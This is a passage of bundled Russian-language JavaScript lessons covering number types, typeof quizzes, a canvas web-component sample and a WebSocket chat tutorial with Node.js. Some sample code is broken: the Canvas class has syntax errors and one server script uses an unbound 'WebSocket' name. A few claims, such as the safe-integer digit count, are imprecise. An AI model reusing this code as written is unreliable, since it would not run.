обратите внимание на следующее выражение:\n\n~~~console\nmessage + string\n~~~\n\nЗдесь оператор **~ + ~** выступает в роли оператора **конкатенации строк**.\nЭто создает определенные неудобства, поскольку нам привычнее рассматривать его как **арифметический оператор** сложения.\n^^Учитывая **динамическую типизацию**, такая двойственность оператора **~ + ~** может привести к неприятным побочным эффектам, которые мы рассмотрим в разделе \"Приведение типов\".^^\n^^Позже мы познакомимся с **темплейтными литералами**, которые позволят нам избегать конкатенации строк.^^\n\n______________________________________________________________\n\n### ![ico-25 icon] Number\n\n**тип данных: \"number\"**.\n\n![ico-20 warn] Записывается без кавычек.\n\n![ico-20 warn] Для отделения десятичных разрядов используется точка:\n\n~~~js\nvar x = 53.25\n~~~\n\nЭто самый проблемный тип данных в JavaScript.\n\nРазберемся, в чем тут проблема.\n\nК одному и тому же типу ~number~ относятся целые числа, десятичные числа (числа с плавающей точкой), числа в экспоненциальной форме (~5e+37~), а так же такие значения, как **~Infinity~** (бесконечность) и **~NaN~** (**Not a Number** - не число).\n\n| целое число                    | ~15~                        |\n| число с плавающей точкой       | ~5.80~                      |\n| число в экспоненциальной форме | ~5e+37~                     |\n| **~Infinity~**                 | бесконечность               |\n| **~NaN~**                      | **Not a Number** - не число |\n\nСуществует ограничение на величину числа, что связано с выделением памяти на хранение данных типа **~number~**.\n\n#### ![ico-20 icon] Целые числа\n\n**Безопасное** целое число может содержать максимум 15 цифр:\n\n{{{vars-number-1.js}}}\n\nОбратите внимание, что после 20 цифр число автоматически представляется в экспоненциальной форме.\n\n#### ![ico-20 icon] Экспоненциальная форма\n\nЦелые числа с большим количеством нулей (500000000000000) или очень маленькие числа с плавающей точкой (0.000000001) гораздо удобнее записывать в экспоненциальной форме.\n\nЭкспоненциальная форма записи числа имеет вид: **~1.8e+5~**, где символ **~e ~** разделяет мантиссу и порядок числа. В этом примере мантисса (содержательная часть числа) равна **~1.8~**, а **~5 ~**- это степень, в которую нужно возвести число **~10~**. Чтобы получить число в привычном для нас виде, нужно умножить мантиссу на число, получившееся в результате возведения в степень числа **~10~**:\n\n••1.8 ✖ 10↑↑5 ↑↑••\n\nВ результате мы получим число **180000**.\n\n••500 → 5e+2 (5 * 10↑↑2 ↑↑)••\n••5000 → 5e+3 (5 * 10↑↑3 ↑↑)••\n••50000 → 5e+4 (5 * 10↑↑4 ↑↑)••\n\n••0.05 → 5e-2 (5 / 10↑↑2 ↑↑)••\n••0.005 → 5e-3 (5 / 10↑↑3 ↑↑)••\n••0.0005 → 5e-4 (5 / 10↑↑4 ↑↑)••\n\n{{{vars-number-exponential-1.js}}}\n\nОднако \"под капотом\" движок сам преобразовывает число к экспоненциальной форме для экономии памяти.\n\n{{{vars-number-exponential-2.js}}}\n\n_____________________________________\n\n#### ![ico-20 icon] Infinity\n\n![ico-20 warn] Значение **~Infinity~** может получиться при делении на ноль:\n\n~~~js\nvar x = 1, y = 0\nvar z = x / y\n~~~\n\n^^Значением переменной **~z ~** будет  *~Infinity~*.^^\n\nВообще говоря, *~Infinity~* - это константа, имеющая определенное значение, что связано с ограничением объема памяти для хранения чисел.\n\n{{{vars-number-infinity.js}}}\n\n_____________________________________\n\n#### ![ico-20 icon] NaN\n\n![ico-20 warn] Значение **~NaN~** может получиться при попытке выполнения арифметических операций с операндами, которые не являются числами и не приводятся к числу, например:  ~5 * 'total'~, а так же при попытке разделить ноль на ноль: ~0/0~.\n\n![ico-20 warn] Значение **~NaN~** не равно никакому другому значению, включая само значение **~NaN~**.\n\n![ico-20 warn] Никакие арифметические операции в JS никогда не будут завершены с ошибкой, поскольку в случае ошибки операция вернет **~NaN~**.\n\n__________________________________________________\n\n#### ![ico-20 icon] Погрешность вычислений\n\nА теперь поговорим о точности вычислений и округлении чисел.\n\n{{{vars-number-4.js}}}\n\nИтак, работа с числами у нас явно не в приоритете, и  если вы вдруг решите использовать **JS** как **Fortran**, то вам придется попариться с погрешностями вычислений.\n\n_____________________________________\n\n#### ![ico-20 icon] Тесты number\n\n◘◘** 1**◘◘\n\n→→→ 8e-2 | 800, 0.8, 0.08, 8 | 0.08 →→→\n\n◘◘** 2**◘◘\n\n→→→ 1.7e+2 | 170, 1.7, 0.17, 17 | 170 →→→\n\n◘◘** 3**◘◘\n\n→→→ 0.3e+310 | 3e+309, Infinity | Infinity →→→\n\n◘◘** 4**◘◘\n\n→→→ 3e-300 ✖ 1e+30 | 3e-900, Infinity, 0, 3e-270 | 3e-270 →→→\n\n◘◘** 5**◘◘\n\n→→→ 1e-5 + 2e-5 | 3e-5, 0.00003, 0.000030000000000000004, NaN | 0.000030000000000000004 →→→\n\n◘◘** 6**◘◘\n\n→→→ 0.003 + 0.0015 | 0.0045000000000000005, 0.0045, 45e-4, NaN | 0.0045000000000000005 →→→\n\n◘◘** 7**◘◘\n\n→→→ 5e+310 - Infinity | 0, Infinity, NaN | NaN →→→\n\n◘◘** 8**◘◘\n\n→→→ 0.005 + Infinity + NaN | 0.005, 0, Infinity, NaN | NaN →→→\n\n◘◘** 9**◘◘\n\n→→→ 5e+300 - Infinity | 5e+300, 0, -Infinity, NaN | -Infinity →→→\n\n______________________________________________________________\n\n### ![ico-20 icon] Boolean\n\nЛогический тип.\n\nПринимает только два возможных значения:  **~true~**  или  **~false~**.\n\n^^(без кавычек, '_true_' - это уже строка).^^\n\nДанные этого типа автоматически получаются в результате сравнений:\n\n~~~js\n5 > 8\n~~~\n~~~console\nfalse\n~~~\n\n~~~js\n'a' < 'b'\n~~~\n~~~console\ntrue\n~~~\n\nЗаодно, кстати, мы познакомились с бинарными операторами сравнения ** >** и ** <**.\nС помощью операторов сравнения создаются **логические выражения**.\nРезультатом вычисления значения **логического выражения** всегда будет **логическое значение** (**~true~**  или  **~false~**).\n\nТ.е если мы объявим переменную **~bool~**:\n\n~~~js\nvar bool = 5 > 8\n~~~\n\nто это будет переменная **логического типа** (**~boolean~**).\n\nДалее мы будем часто сталкиваться с данными типа **~boolean~**.\n\n______________________________________________________________\n\n### ![ico-20 icon] undefined\n\n**тип данных: \"undefined\"**.\n\nПеременные иногда объявляются без присваивания им начального значения.\n\nЕсли переменная объявлена без значения, ее значение будет **~undefined~**.\n\n^^(без кавычек, _'undefined'_ - это уже строка).^^\n\n______________________________________________________________\n\n## ![ico-25 icon] Оператор typeof\n\n^^Еще один оператор языка, с которым вы знакомитесь сегодня.^^\n^^Первый, как вы помните, это **оператор присваивания**.^^\n^^Далее мы познакомились с двумя **операторами сравнения**.^^\n\nОператоры языка всегда имеют **операнды**.\nНапример, у оператора присваивания два операнда: один - слева, второй - справа.\n\n![ico-20 warn] Операнды всегда отделяются от оператора пробелом.\n\nВ зависимости от числа операндов оператор может быть:\n\n| оператор  | число операндов | пример |\n| унарный   | 1               | **~typeof~** |\n| бинарный  | 2               | **~ =~**, **~ >~**, **~ <~** |\n| тернарный | 3               | этот оператор мы рассмотрим чуть позже |\n\nОбъявим переменную **~num~** и присвоим ей значение 10:\n\n~~~js\nvar num = 10\n~~~\n\nА теперь воспользуемся оператором **~typeof~**, чтобы узнать тип данных переменной **~num~**:\n\n~~~js\ntypeof num\n~~~\n\nВ консоли мы увидим:\n\n~~~console\n'number'\n~~~\n\nДавайте разберемся, что делает движок, когда встречает выражение ~**typeof** num~.\nДвижок вычисляет значение этого выражения и заменяет выражение ~**typeof** num~ на вычисленное значение.\n\nПосмотрим еще один пример:\n\n~~~js\nvar companyName = 'Google'\n\ntypeof companyName\n~~~\n\n~~~console\n'string'\n~~~\n\n![ico-25 warn] Оператор **~typeof~** возвращает **строку**.\n\nЧто это означает?\n\n~~~js\nvar boolean = false\n\ntypeof boolean\n~~~\n\n~~~console\n'boolean'\n~~~\n\nЭто означает, что если движок столкнется с таким выражением (лишенным всякого смысла, кроме познавательного - для вас):\n\n~~~js\ntypeof typeof boolean\n~~~\n\nто мы всегда получим один и тот же ответ:\n\n~~~console\n'string'\n~~~\n\nВозможные значения (строки), возвращаемые оператором **~typeof~**:\n\n• ~string~\n• ~number~\n• ~bigint~\n• ~boolean~\n• ~object~\n• ~undefined~\n• ~function~\n• ~symbol~\n\nКак видите, в этом списке есть типы данных, которые мы пока не рассматривали и которые нам еще предстоит изучить.\n\n__________________________________________________\n\n### ![ico-20 icon] Тесты typeof\n\n◘◘** 1**◘◘\n\n→→→ typeof 2e-200 | 'number', 'string', 'boolean', 'undefined' | number →→→\n\n◘◘** 2**◘◘\n\n→→→ typeof NaN | 'number', 'string', 'boolean', 'undefined' | number →→→\n\n◘◘** 3**◘◘\n\n→→→ typeof 'Infinity' | 'number', 'string', 'boolean', 'undefined' | string →→→\n\n◘◘** 4**◘◘\n\n→→→ typeof 5 > 8 | 'number', 'string', 'boolean', 'undefined' | boolean →→→\n\n◘◘** 5**◘◘\n\n→→→ typeof undefined | 'number', 'string', 'boolean', 'undefined' | undefined →→→\n\n__________________________________________________\n\n## [![ico-25 icon] Спецификация ECMAScript](https://tc39.es/ecma262/multipage/ecmascript-data-types-and-values.html )\n\nСовременная спецификация языка определяет семь типов данных:\n\n• **Boolean**\n• **Null**\n• **Undefined**\n• **Number**\n• **String**\n• **Symbol**\n• **Object**\n\nОператор **~typeof~** работает \"по старинке\", поскольку если бы принцип его работы был изменен, то многие сайты, созданные до 2015 года, просто посыпались бы.\nОднако используя его, стоит помнить о его \"несовершенстве\".\n\nПри сравнении типов данных двух переменных учитывайте, что символы расположены в кодировочной таблице в алфавитном порядке, поэтому при сравнении большим будет тот,\nкоторый расположен дальше от начала таблицы.\n"},30322:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-30 icon] Примеры веб-компонентов\n\n[![ico-30 cap] Slider](https://garevna.github.io/js-samples/#19)\n\n[![ico-30 cap] Spoiler](https://repl.it/@garevna/web-component)\n\n[![ico-30 cap] Game](https://github.com/garevna/game/wiki)\n\n\n◘◘![ico-30 cap] Canvas◘◘\n~~~js\nclass Canvas extends HTMLElement {\n  constructor (pointsNum = 200) {\n    super()\n    \n    Object.assign(this, {\n      this.shadow: this.attachShadow({ mode: 'closed' })\n      pointsNum: pointsNum\n      points: []\n      loop: this.loop.bind(this)\n    })\n  }\n    \n  connectedCallback () {      \n    this.canvas = this.shadow\n      .appendChild(document.createElement('canvas'))\n    this.resizeCanvas()\n        \n    this.ctx = this.canvas.getContext('2d')\n        \n    while (this.points.length < this.pointsNum) {\n      this.points.push(new CanvasPoint(this.canvas, this.ctx))\n    }\n        \n    window.addEventListener('resize', this.resizeCanvas.bind(this) \n    this.loop()\n  }\n    \n  loop () {\n    this.draw()\n    requestAnimationFrame(this.loop)\n  }\n    \n  resizeCanvas () {\n    Object.assign(this, {\n      w: window.innerWidth * 0.8,\n      h: window.innerHeight * 0.8\n    })\n\n    Object.assign(this.canvas, {\n      width: this.w,\n      height: this.h\n    })\n  }\n    \n  async movie () {\n    this.draw()\n    requestAnimationFrame(this.movie)\n  }\n    \n  drawPoint (point) {\n    point.draw()\n    this.points.forEach(target => point.drawLine(target))\n  }\n    \n  draw () {\n    this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height)\n    this.ctx.globalCompositeOperation = 'lighter'\n    this.points.forEach(point => this.drawPoint(point))\n  }\n}\n\n\nfunction CanvasPoint (canvas, ctx) {\n  Object.assign(this, {\n    canvas,\n    ctx,\n    maxVelocity: { x: 5, y: 5 },\n\n    random: num => Math.round(Math.random() * num),\n\n    setPosition: function () {\n      Object.assign(this, {\n        x: this.random(this.canvas.width),\n        y: this.random(this.canvas.height)\n      })\n    },\n    \n    changePosition = function () {\n      this.x = this.x + this.vx > this.canvas.width\n        ? 0\n        : this.x + this.vx < 0\n          ? this.canvas.width\n          : this.x + this.vx\n\n      this.y = this.y + this.vy > this.canvas.height\n        ? 0\n        : this.y + this.vy < 0\n          ? this.canvas.height\n          : this.y + this.vy\n    },\n    \n    getDistance: function (point) {\n      return Math.sqrt(Math.pow(this.x - point.x, 2) + Math.pow(this.y - point.y, 2))\n    }\n  })\n  \n  this.setPosition()\n  \n  Object.assign(this, {\n    radius: this.random(1),\n    rgba: this.colors[this.random(this.colors.length - 1)],\n    vx: this.random(this.maxVelocity.x),\n    vy: this.random(this.maxVelocity.y),\n    \n    draw: function () {\n      Object.assign(this.ctx, {\n        fillStyle: this.rgba,\n        strokeStyle: this.rgba\n      })\n\n      \n      this.ctx.beginPath()\n      this.ctx.arc(this.x, this.y, 1, 0, Math.PI * 2, true)\n      this.ctx.fill()\n      this.ctx.closePath()\n        \n      this.changePosition()\n    },\n    \n    drawLine: function (target) {\n      const dist = this.getDistance(target)\n\n      if (this.rgba == target.rgba && dist < 200) {\n        Object.assign(this.ctx, {\n          lineWidth: 0.2,\n          strokeStyle: this.rgba\n        })\n\n        this.ctx.beginPath()\n        this.ctx.moveTo(this.x, this.y)\n        this.ctx.lineTo(target.x, target.y)\n        this.ctx.stroke()\n      }\n    }\n  })\n}\n\nCanvasPoint.prototype.colors = ['#f0f','#8f8','#f50','#09b','#ff9']\n\ncustomElements.define('canvas-element', Canvas)\n\ndocument.body.style.background = '#000'\n\ndocument.body.appendChild(document.createElement('canvas-element'))\n~~~\n\n{{{web-component-samples.js}}}"},84486:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] WebSocket\n\n**WebSockets API** позволяет веб-приложениям использовать протокол ~WebSockets~ для двусторонней связи с удаленным хостом\n\n^^~WebSockets~, как и ~Local Storage~ и ~Geolocation~, изначально был частью спецификации HTML5^^\n\n^^Cогласно спецификации протокола,^^\n^^соединение ~WebSocket~ стартует как HTTP-соединение,^^\n^^гарантируя полную обратную совместимость с миром до WebSocket^^\n\nПереключение протокола с ~HTTP~ на ~WebSocket~ называется рукопожатием ( _handshake_ ) ~WebSocket~\n\nПри отправке запроса на сервер браузер с помощью заголовков **~Connection~** и **~Upgrade~** сообщает, что он хочет переключиться с протокола ~HTTP~ на ~WebSocket~:\n\n^^^[Request Headers]\n\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,ru;q=0.8\nCache-Control: no-cache\nConnection: Upgrade\nHost: echo.websocket.org\nOrigin: null\nPragma: no-cache\nSec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\nSec-WebSocket-Key: FWRPxaoGQhQaeqg1eRPHTw==\nSec-WebSocket-Version: 13\nUpgrade: websocket\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\n\n^^^\n\nЕсли сервер поддерживает протокол ~WebSocket~, он соглашается на переключение протокола через те же заголовки **~Connection~** и **~Upgrade~**\n\n^^^[Response Headers]\n\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Headers: content-type\nAccess-Control-Allow-Headers: authorization\nAccess-Control-Allow-Headers: x-websocket-extensions\nAccess-Control-Allow-Headers: x-websocket-version\nAccess-Control-Allow-Headers: x-websocket-protocol\nAccess-Control-Allow-Origin: null\nConnection: Upgrade\nDate: Mon, 31 Dec 2018 19:53:07 GMT\nSec-WebSocket-Accept: OQbuqh0sOBKbPsVMFPKNpI75N8I=\nServer: Kaazing Gateway\nUpgrade: websocket\n\n^^^\n\nВ этот момент HTTP-соединение разрывается и заменяется ~WebSocket~-соединением через то же TCP/IP\n\n~WebSocket~-соединение использует те же порты по умолчанию, что и HTTP (~80~) и HTTPS (~443~)\n\n_____________________________________________\n\n## ![ico-25 hw] Упражнение 1\n\n\n<img src=\"https://www.piesocket.com/blog/wp-content/uploads/2021/12/websocket-for-free.png\" height=\"150\"/> Воспользуемся готовым WebSocket-сервером **~https://www.piesocket.com/~**, который возвращает назад сообщение, отправленное ему с клиента\n\nСовременные браузеры поддерживают протокол ~WebSocket~, поэтому создание объекта ~WebSocket~-соединения не представляет проблемы - это просто вызов конструктора\n\nСоздадим ~WebSocket~-соединение прямо в консоли браузера:\n\n~~~js\nconst apiKey = 'oCdCMcMPQpbvNjUIzqtvF1d2X2okWpDQj4AwARJuAgtjhzKxVEjQU6IdCjwm'\n\nconst websocket = new WebSocket(`wss://demo.piesocket.com/v3/channel_1?api_key=${apiKey}`)\n~~~\n\nПри вызове конструктора **WebSocket** необходимо передать ему обязательный аргумент \n\n\n••протокол://домен:порт••\n\n\n• протокол может быть ~ws~ или ~wss~\n• домен будет ~demo.piesocket.com~ (точнее говоря, это субдомен demo домена piesocket.com)\n• порт мы оставляем на усмотрение сервера\n\n(Заметим, что этот API требует наличия ключа apiKey, который легко получить, зарегистрировавшись на сайте ~https://www.piesocket.com/~)\n\nСозданный с помощью конструктора **WebSocket** экземпляр **_~websocket~_** \nимеет свойства ~onopen~, ~onmessage~, ~onclose~ и ~onerror~, \nа также методы ~send()~ и ~close()~, \nи всем этим арсеналом мы сейчас воспользуемся:\n\n◘◘![ico-20 cap]◘◘\n\n~~~js\nconst apiKey = 'oCdCMcMPQpbvNjUIzqtvF1d2X2okWpDQj4AwARJuAgtjhzKxVEjQU6IdCjwm'\n\nconst websocket = new WebSocket(`wss://demo.piesocket.com/v3/channel_1?api_key=${apiKey}`)\n\nwebsocket.onopen = function (event) {\n  console.log('CONNECTED')\n  websocket.send('Happy New Year!')\n}\n\nwebsocket.onclose = function (event) {\n  console.log('DISCONNECTED')\n}\n\nwebsocket.onmessage = function (event) {\n  console.log(event.data)\n  websocket.close()\n}\n\nwebsocket.onerror = function (event) {\n  console.error(`ERROR: ${event.data}`)\n}\n~~~\n\n◘◘Результат в консоли:◘◘\n\n~~~console\nCONNECTED\nHappy New Year!\nDISCONNECTED\n~~~\n\n_____________________________________________\n\n## ![ico-25 hw] Упражнение 2\n\nДля получения некоторого экспириенса с веб-сокетами нам придется познакомиться с серверным JS\n\nНе забудьте создать отдельную папку для наших экспериментов и перейти в нее\n\nИтак, платформа **~Node.js~** станет основой нашего приложения\n\nВ **~Node.js~** нет встроенной поддержки ~WebSocket~, поэтому установим плагин **~ws~**\n\n### ![ico-20 bash] Установка\n\n••$ npm install ws••\n\nТеперь создадим вебсокет-сервер \n\nДля этого нам нужен **серверный** скрипт\n\nСоздадим файл **_start.js_**\n\nВ **~Node.js~** все файлы, включаемые в приложение - это отдельные модули\n\nЧтобы подключить модуль к исполняемому скрипту, необходимо использовать функцию **_~require~_**\n\nНам нужно подключить модуль **~ws~**, который мы уже установили:\n\n~~~js\nconst socket = require('ws')\n~~~\n\nТеперь этот модуль доступен нам под именем **_socket_**\n\nС его помощью мы и создадим ~WebSocket~ сервер на порту ~8080~\n\n◘◘![ico-20 cap]◘◘\n\n~~~js\nconst server = new WebSocket.Server({ port: 8080 })\n~~~\n\nТеперь в переменной **_server_** у нас ссылка на объект **~WebSocket~**-сервера\n\nИспользуя событие ~connection~ **~WebSocket~**-сервера,\n\nсоздадим обработчика события ~message~ объекта **_socket_**\n\nОбработчик будет отсылать в ответ на полученное сообщение JSON-строку\n\nс именем отправителя \"server\" и текстом \"I listen to you\",\n\nа затем выводить в консоль полученное от клиента сообщение:\n\n◘◘![ico-20 cap]◘◘\n\n~~~js\nserver.on('connection', socket => {\n  socket.on('message', received => {\n    socket.send(JSON.stringify({\n      name: 'server',\n      message: 'I listen to you'\n    }))\n\n    const mess = JSON.parse(received)\n    console.log(`received from a client\\n${mess.user.name}: ${mess.message}`)\n  })\n})\n~~~\n\nИтак, серверный скрипт готов, сохраним его в файл **start.js**\n\n◘◘![ico-20 cap] start.js◘◘\n\n~~~js\nconst WebSocket = require('ws')\n\nconst server = new WebSocket.Server({ port: 8080 })\n\nserver.on('connection', socket => {\n  socket.on('message', received => {\n    socket.send(JSON.stringify({\n      name: 'server',\n      message: 'I listen to you'\n    }))\n\n    const mess = JSON.parse(received)\n    console.log(`received from a client\\n${mess.name}: ${mess.message}`)\n  })\n})\n~~~\n\n![ico-20 bash] и запустим с помощью консольной команды:\n\n••$ node start.js••\n\nТеперь откроем новую вкладку и введем в адресной строке браузера:\n~http://localhost:8080/~\n\nНа странице появится сообщение _Upgrade Required_\n\nЭто потому, что мы указали протокол ~http~, а запущенный нами на порту ~8080~ сервер работает по протоколу ~ws~\n\nВ консоли этой вкладки введем \"клиентский\" код:\n\n~~~js\nconst socket = new WebSocket('ws://localhost:8080')\n\nsocket.addEventListener('open', () => {\n  socket.send(JSON.stringify({\n    name: 'Admin',\n    message: 'Hello, do you listen to me ?'\n  }))\n})\n\nsocket.addEventListener('message', event => {\n  console.log(JSON.parse(event.data))\n})\n~~~\n\nпоскольку мы создаем сервер на локальной машине, \n\nдомен будет **_localhost_** или **_127.0.0.1_**\n\nпорт мы уже выбрали - 8080\n\nПосле выполнения кода:\n\n~~~js\nconst socket = new WebSocket('ws://localhost:8080')\n~~~\n\nв переменной **socket** у нас будет ссылка на экземпляр WebSocket-соединения, \n\nу которого есть событие **~open~** и метод **~send~** \n\n(как видим, события и методы на стороне сервера и клиента одни и те же, \n\nпоскольку это соединение двух \"равноправных\" партнеров для обмена сообщениями)\n\nИтак, когда соединение будет открыто, клиент \n\n(пока из консоли браузера) \n\nотправит на сервер сообщение - JSON-строку \n\nс именем отправителя \"_Admin_\" и текстом \"_Hello, do you listen to me ?_\"\n\n◘◘![ico-20 bash] Результат в консоли bash◘◘\n\n~~~console\n$ node start.js\nreceived from a client:\n                Admin\n                Hello, do you listen to me ?\n~~~\n\n◘◘Результат в консоли браузера◘◘\n\n~~~console\n▼ { name: \"server\", message: \"I listen to you\" }\n    message: \"I listen to you\"\n    name: \"server\"\n  ► __proto__: Object\n~~~\n\n_____________________________________________\n\n## ![ico-25 hw] Упражнение 3\n\nСоздадим простенький чат\n\n### ![ico-50 node] Серверная часть\n\nТеперь серверный скрипт будет немного сложнее, поэтому углубимся в **~Node.js~**\n\nПервое, с чем мы познакомимся - это модуль **~fs~** ([**^^File System^^**](https://nodejs.org/api/fs.html))\n\nДля подключения модуля **~fs~** нужно использовать функцию ~require~:\n\n~~~js\nconst fs = require('fs')\n~~~\n\nС помощью модуля ~fs~ мы будем читать (а можно и писать) файлы на сервере\n\nДавайте сначала создадим такие файлы\n\n^^^[users.json]\n\n~~~json\n[\n  {\n    \"name\": \"Иван\",\n    \"photo\": \"https://apollo-ireland.akamaized.net/v1/files/5bucx1wiqmes-UA/image;s=644x461\"\n  },\n  {\n    \"name\": \"Ольга\",\n    \"photo\": \"https://orig00.deviantart.net/ecd9/f/2015/050/9/3/gravity_falls_icon__wendy_by_mikeinel-d8iowct.gif\"\n  },\n  {\n    \"name\": \"Демьян\",\n    \"photo\": \"https://leoterra.com/sites/default/files/clAvHWVG4GE.jpg\"\n  },\n  {\n    \"name\": \"Денис\",\n    \"photo\": \"https://avatars.mds.yandex.net/get-pdb/1058492/c606d11d-e4fb-4d5b-9de6-84e590c34f8b/s1200\"\n  },\n  {\n    \"name\": \"Вероника\",\n    \"photo\": \"https://super.urok-ua.com/wp-content/uploads/2017/04/Avatarka-11-2.jpg\"\n  }\n]\n~~~\n\n^^^\n\n\n^^^[messages.json]\n\n~~~json\n[\n  \"Привет!\",\n  \"Пойдем в кино ?\",\n  \"Кто сделал домашку ?\",\n  \"У меня проблемы с промисами... :(\",\n  \"Кто вчера был на конфе ? Поделитесь впечатлениями\",\n  \"Я повторяю веб-компоненты - совсем опух...\",\n  \"Похоже, гитлаб опять лег...\",\n  \"Кто уже закачал проект на гит ?\",\n  \"Я спал вчера 2 часа\",\n  \"А я начинаю понимать промисы :)\",\n  \"Вот бы недельку передышки, чтобы только пилить код :)\",\n  \"Меня посылают в командировку, похоже, не попаду на защиту :(\",\n  \"Кто завтра идет на коворкинг ? Встречаемся ?\",\n  \"Отослал резюме на джуна, жду ответа\",\n  \"Завтра у меня собес, пожелайте мне ни пуха\",\n  \"Кто чем планирует заниматься на праздники ?\",\n  \"Мне достался такой жуткий проект по верстке, что я в осадке...\",\n  \"Не очень получается отцентровать иконки соцсетей в окружностях\",\n  \"Я респонсив замутил уже, правда только до 1024рх\"\n]\n~~~\n\n^^^\n\nОбъявим два пустых массива\n\n~~~js\nconst users = []\nconst messages = []\n~~~\n\nв которые мы будем помещать данные из файлов **~users.json~** и **~messages.json~**\n\nТеперь воспользуемся методом **_~readFile()~_** модуля **~fs~** для чтения этих файлов\n\n~~~js\nfs.readFile('users.json', 'utf8', (err, content) => users.push(...JSON.parse(content)))\n\nfs.readFile('messages.json', 'utf8', (err, content) => messages.push(...JSON.parse(content)))\n~~~\n\nЭтот метод принимает три аргумента:\n\n| • | имя файла ( и путь к файлу, если он расположен не в корневой папке ) |\n| • | кодировка |\n| • | коллбэк-функция, которая будет вызвана, когда файл будет прочитан, и ей будет передано два аргумента: |\n|   | • сообщение об ошибке, если чтение файла завершится неудачей |\n|   | • содержимое файла в противном случае |\n\nПрочитанное содержимое мы помещаем в ранее объявленные массивы **_~users~_** и **_~messages~_**\n\nДалее мы создаем вебсокет-сервер, как мы это уже делали в предыдущем упражнении\n\n~~~js\nconst WebSocket = require('ws')\nconst server = new WebSocket.Server({ port: 8080 })\n~~~\n\nТеперь нужно познакомиться поближе с вебсокет-сервером\n\nКаждый раз, когда происходит подключение нового клиента к вебсокет-серверу, происходит событие ~connection~\n\nМы устанавливаем обработчика события ~connection~\n\nЭтот колбэк получает в качестве аргумента экземпляр нового соединения\n\n~~~js\nserver.on('connection', client => {\n  ...\n}\n~~~\n\nЭтот экземпляр (_client_) попадает в итерабельный объект **~server.clients~** (экземпляр класса ~Set~)\n\nОт своего конструктора (~Set~) **~server.clients~** наследует методы:\n\n| • add     | • clear   |\n| • delete  | • entries |\n| • forEach | • has     |\n| • keys    | • values  |\n\nМы воспользуемся методом ~forEach~, чтобы сделать рассылку каждого нового сообщения всем подключенным клиентам\n\n~~~js\nserver.on('connection', client => {\n  client.on('message', received => {\n    server.clients.forEach(client => client.send(received))\n  })\n}\n~~~\n\nДля более оживленного чата при каждом поступлении на сервер сообщения от клиента добавим отправку всем клиентам случайно выбранного сообщения из массива **_messages_** от случайно выбранного клиента  из массива **_users_**\n\n~~~js\nserver.on('connection', client => {\n  client.on('message', received => {\n    server.clients.forEach(client => client.send(received))\n    const newMessage = {\n      user: users[randomValue(users.length - 1)],\n      message: messages[randomValue(messages.length - 1)]\n    }\n    server.clients.forEach(client => client.send(JSON.stringify(newMessage)))\n  })\n}\n~~~\n\nгде **_randomValue_** - функция:\n\n~~~js\nconst randomValue = num => Math.round(Math.random() * num)\n~~~\n\nИтак, серверный скрипт полностью готов:\n\n◘◘![ico-20 file] start.js◘◘\n\n~~~js\nconst fs = require('fs')\n\nconst [users, messages] = [[], []]\n\nfs.readFile('users.json', 'utf8', (err, content) => users.push(...JSON.parse(content)))\n\nfs.readFile('messages.json', 'utf8', (err, content) => messages.push(...JSON.parse(content)))\n\nconst WebSocket = require('ws')\n\nconst server = new WebSocket.Server({ port: 8080 })\n\nserver.on('connection', client => {\n  client.on('message', received => {\n    server.clients.forEach(_client => _client.send(received))\n    const newMessage = {\n      user: users[randomValue(users.length - 1)],\n      message: messages[randomValue(messages.length - 1)]\n    }\n    server.clients.forEach(_client => _client.send(JSON.stringify(newMessage)))\n  })\n})\n\nconst randomValue = num => Math.round(Math.random() * num)\n~~~\n\n__________________________________________________________________________\n\n### ![ico-20 icon] Клиентская часть\n\n\n◘◘![ico-20 file] index.html◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html lang=\"ru\">\n  &lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Websocket&lt;/title>\n  &lt;/head>\n\n  &lt;body>\n    &lt;chat-element\n        username=\"user\"\n        photo=\"https://i.pinimg.com/originals/0c/a9/e2/0ca9e28dcb12dc698cfd2beda6d6fa64.jpg\">\n    &lt;/chat-element>\n    &lt;script src = \"./chat.js\">&lt;/script>\n    &lt;script src = \"./index.js\">&lt;/script>\n  &lt;/body>\n\n&lt;/html>\n~~~\n\nКак можно увидеть из кода разметки, мы подключаем два файла скриптов ( chat.js и index.js ), которые должны находиться в корневой папке приложения\n\nКроме того, в разметке присутствует веб-компонент ~&lt;chat-element>~ с атрибутами **_~username~_** и **_~photo~_**, значения которых вы можете изменить по своему усмотрению\n\nТеперь создадим веб-компонент ~&lt;chat-element>~\n\n◘◘![ico-20 file] chat.js◘◘\n\n~~~js\nclass ChatElement extends HTMLElement {\n  constructor () {\n    super ()\n\n    this.name = this.getAttribute('username') || 'admin'\n    this.photo = this.getAttribute('photo') || 'http://hypeava.ru/uploads/posts/2018-03/1522076645_4.jpg'\n\n    const shadow = this.attachShadow({ mode: 'open' })\n\n    this.chatWindow = Object.assign(document.createElement('div'), {\n      className: 'chat'\n    })\n\n    const input = Object.assign(document.createElement('input'), {\n      innerText: 'Send message',\n      onchange: this.sendMessage.bind(this)\n    })\n\n    this.css = Object.assign(document.createElement('style'), {\n      textContent: `\n        * {\n          font-family: monospace, Arial;\n        }\n        .chat {\n          width: ${window.innerWidth - 20}px;\n          height: ${window.innerHeight - 120}px;\n          border: inset 1px;\n        }\n        input {\n          width: ${window.innerWidth - 50}px;\n          border: inset 1px;\n          background-color: #ded;\n          box-shadow: inset 3px 3px 5px #00000090;\n          padding: 8px 14px;\n          outline: none;\n        }\n        p, img, .small, .text {\n          margin: 4px 8px;\n        }\n        p {\n          font-weight: bold;\n          color: green;\n        }\n        .small {\n          font-size:10px;\n        }\n      `\n    })\n\n    shadow.appendChild(this.css)\n    shadow.appendChild(this.chatWindow)\n    shadow.appendChild(input)\n  }\n\n  sendMessage (event) {\n    const mess = {\n      user: {\n        name: this.name,\n        photo: this.photo\n      },\n      message: event.target.value\n    }\n    socket.send(JSON.stringify(mess))\n  }\n  \n  reseiveMessage (mess) {\n    const messageObject = JSON.parse(mess)\n\n    const messageElement = document.createElement('div')\n  \n    const ava = 